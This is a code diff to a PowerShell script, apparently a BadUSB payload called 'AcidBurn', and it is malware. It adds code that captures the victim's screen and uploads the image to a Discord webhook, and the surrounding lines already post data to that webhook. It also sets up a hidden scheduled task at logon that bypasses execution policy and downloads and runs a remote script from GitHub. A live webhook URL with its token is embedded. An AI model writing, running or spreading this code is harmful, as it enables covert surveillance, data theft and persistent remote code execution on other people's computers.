@@ -27,6 +27,34 @@ try {
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
     Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1519137397022130196/X1Pyzeu-cYDoWXpEb5Evo9KFNKgpoeOhdLEsS9NbLWy5gvKkvqeqOZlxuCQV92Xi5XYT" -Method Post -Body $bytes -ContentType "application/json; charset=utf-8"
 
+    # --- SCREENSHOT ---
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Drawing
+    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+    $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
+    $gfx = [System.Drawing.Graphics]::FromImage($bmp)
+    $gfx.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
+    $shot = "$env:TEMP\ab_shot.png"
+    $bmp.Save($shot, [System.Drawing.Imaging.ImageFormat]::Png)
+    $gfx.Dispose()
+    $bmp.Dispose()
+
+    # --- UPLOAD SCREENSHOT ---
+    $url = "https://discord.com/api/webhooks/1519137397022130196/X1Pyzeu-cYDoWXpEb5Evo9KFNKgpoeOhdLEsS9NbLWy5gvKkvqeqOZlxuCQV92Xi5XYT"
+    $fileBytes = [System.IO.File]::ReadAllBytes($shot)
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $LF = "`r`n"
+    $enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
+    $bodyLines = (
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"file`"; filename=`"screen.png`"",
+        "Content-Type: image/png$LF",
+        $enc.GetString($fileBytes),
+        "--$boundary--$LF"
+    ) -join $LF
+    Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
+
+    # --- PERSISTENCE ---
     $taskName = "AcidBurn"
     $cmd = "powershell -w hidden -ep bypass -c `"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/stargosg/Ducky/refs/heads/main/x.ps1')`""
     schtasks /create /tn $taskName /tr $cmd /sc onlogon /f 2>$null
